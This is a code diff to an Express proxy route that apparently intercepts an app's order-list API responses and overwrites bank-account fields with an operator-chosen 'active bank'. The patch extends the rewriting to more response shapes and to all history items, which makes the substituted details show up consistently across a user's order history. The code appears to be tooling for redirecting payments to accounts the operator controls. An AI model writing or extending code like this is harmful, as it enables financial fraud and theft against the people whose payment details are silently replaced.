@@ -1826,10 +1826,13 @@ app.all('/xxapi/*', async (req, res) => {
       const bank = getActiveBank(data, userId);
       if (bank) {
         const isListResp = Array.isArray(respData);
-        // Detect nested list: { total, list: [...] }  or  { data: [...] }
+        // Detect nested list: { list:[...] } / { data:[...] } / { records:[...] } / { rows:[...] } / { items:[...] }
         const nestedList = !isListResp && respData && typeof respData === 'object'
-          ? (Array.isArray(respData.list) ? respData.list
-           : Array.isArray(respData.data) ? respData.data
+          ? (Array.isArray(respData.list)    ? respData.list
+           : Array.isArray(respData.data)    ? respData.data
+           : Array.isArray(respData.records) ? respData.records
+           : Array.isArray(respData.rows)    ? respData.rows
+           : Array.isArray(respData.items)   ? respData.items
            : null)
           : null;
 
@@ -1841,22 +1844,19 @@ app.all('/xxapi/*', async (req, res) => {
         function _wasForced(oId) {
           return !!(oId && data.orderBankMap && data.orderBankMap[oId] && data.orderBankMap[oId].forced);
         }
-        // Smart per-item replace: browse items (orderState=0) → blanket replace;
-        // history items (orderState>0) → only replace if we forced this order
+        // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
+        // history items (orderState>0) → blanket replace always (operator sees all history)
         function _replaceListItems(list) {
           list.forEach(item => {
             if (!item || typeof item !== 'object') return;
             const orderState = parseInt(item.orderState ?? item.state ?? -1);
             const isHistoryItem = orderState > 0;
-            if (isHistoryItem) {
-              // History: only replace if this order was forced by our proxy
-              const oId = _getItemOId(item);
-              if (!_wasForced(oId)) return;
-            } else {
-              // Browse (available to buy): minAmount check then blanket replace
+            if (!isHistoryItem) {
+              // Browse (available to buy): minAmount check
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
             }
+            // History items: always replace; browse items: replace (passed minAmount check above)
             const hasAcct = scanHasBankFields(item, 0);
             if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
           });
